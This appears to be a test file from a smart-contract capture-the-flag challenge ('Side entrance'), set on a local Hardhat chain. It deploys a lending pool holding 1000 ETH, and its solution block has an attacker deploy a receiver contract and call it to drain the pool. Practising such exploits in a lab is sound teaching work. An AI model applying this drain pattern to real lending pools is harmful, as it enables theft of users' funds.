import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { SideEntranceLenderPool } from '../../typechain';
import { BigNumber } from '@ethersproject/bignumber';

describe('[Challenge] Side entrance', function () {

    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let pool: SideEntranceLenderPool, attackerInitialEthBalance: BigNumber;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        pool = await SideEntranceLenderPoolFactory.deploy();

        await pool.deposit({ value: ETHER_IN_POOL });

        attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const RECEIVER = await ethers.getContractFactory("SideEntranceLenderReceiver");
        const receiver = await RECEIVER.connect(attacker).deploy(pool.address);

        await receiver.connect(attacker).work()

        await receiver.connect(attacker).withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(pool.address)
        ).to.be.equal('0');

        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(attackerInitialEthBalance);
    });
});
